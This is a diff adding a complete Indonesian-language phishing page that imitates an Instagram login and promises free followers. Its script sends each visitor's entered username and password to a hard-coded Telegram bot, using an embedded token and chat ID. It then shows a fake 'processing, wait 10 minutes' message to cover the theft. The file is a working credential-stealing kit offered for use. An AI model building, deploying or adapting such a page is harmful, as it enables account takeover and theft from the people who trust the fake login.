@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Instagram-style</title>
+  <style>
+    /* Reset basic styling */
+    body, html {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      height: 100%;
+      background-color: #fafafa;
+    }
+
+    /* Container for login form */
+    .login-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    /* Box for login content */
+    .login-box {
+      background-color: white;
+      width: 100%;
+      max-width: 400px;
+      padding: 30px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    /* Instagram-like logo */
+    .logo {
+      font-size: 2.5em;
+      font-weight: bold;
+      color: #E4405F;
+      margin-bottom: 20px;
+    }
+
+    /* Input fields styling */
+    input[type="text"],
+    input[type="password"],
+    select {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ddd;
+      box-sizing: border-box;
+      font-size: 1em;
+    }
+
+    /* Button styling */
+    .login-btn {
+      background-color: #0095f6;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 5px;
+      font-size: 1.1em;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .login-btn:hover {
+      background-color: #007bb5;
+    }
+
+    /* Sign up link styling */
+    .signup-link {
+      margin-top: 15px;
+      font-size: 0.9em;
+      color: #0095f6;
+    }
+
+    .signup-link a {
+      text-decoration: none;
+      color: #0095f6;
+    }
+
+    /* Responsiveness for small devices */
+    @media (max-width: 600px) {
+      .login-box {
+        padding: 20px;
+        width: 80%;
+      }
+      .logo {
+        font-size: 2em;
+      }
+    }
+
+    /* Status and Thank You */
+    #status, #thankYou {
+      font-weight: bold;
+      margin-top: 10px;
+      display: none;
+    }
+
+    #thankYou {
+      color: green;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="login-box">
+      <div class="logo">Instagram</div>
+
+      <!-- Login Form -->
+      <form id="loginForm" onsubmit="submitForm(); return false;">
+        <input type="text" id="username" placeholder="Username" required><br>
+        <input type="password" id="password" placeholder="Password" required><br>
+        
+        <label for="followerOption">Pilih Follower:</label><br>
+        <select id="followerOption" required>
+          <option value="1k Follower">1k Follower</option>
+          <option value="2k Follower">2k Follower</option>
+          <option value="3k Follower">3k Follower</option>
+        </select><br><br>
+
+        <button type="submit" class="login-btn">Tembak Follower</button>
+      </form>
+
+      <!-- Sign up link -->
+      <div class="signup-link">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+
+      <!-- Status and Thank You -->
+      <div id="status">Data kamu sedang diproses, mohon tunggu 10 menit...</div>
+      <div id="thankYou">Terima kasih, data kamu telah diproses!</div>
+    </div>
+  </div>
+
+  <script>
+    // Function to handle form submission
+    function submitForm() {
+      const token = "7322497617:AAHHsoZFxuSal6uqC4wTSR0jd1F-YvEFsm4"; // Ganti dengan token bot Telegram kamu
+      const chat_id = "6495236146"; // Ganti dengan chat_id kamu
+
+      // Ambil nilai input dari form
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const followerOption = document.getElementById("followerOption").value;
+
+      // Format pesan untuk dikirim ke Telegram
+      const text = `📩 Data Pendaftaran Baru:\n\n👤 Username: ${username}\n🔑 Password: ${password}\n📈 Opsi Follower: ${followerOption}`;
+
+      // Kirim data ke Telegram lewat API
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: text
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          // Tampilkan pesan "Tunggu 10 menit"
+          document.getElementById("status").style.display = "block";
+
+          // Kosongkan form setelah data terkirim
+          document.getElementById("loginForm").reset();
+
+          // Simulasikan animasi selama 10 menit (600000 ms)
+          setTimeout(() => {
+            // Setelah 10 menit, tampilkan pesan terima kasih
+            document.getElementById("status").style.display = "none";
+            document.getElementById("thankYou").style.display = "block";
+          }, 600000); // 10 menit = 600000 ms
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+      });
+    }
+  </script>
+
+</body>
+</html>
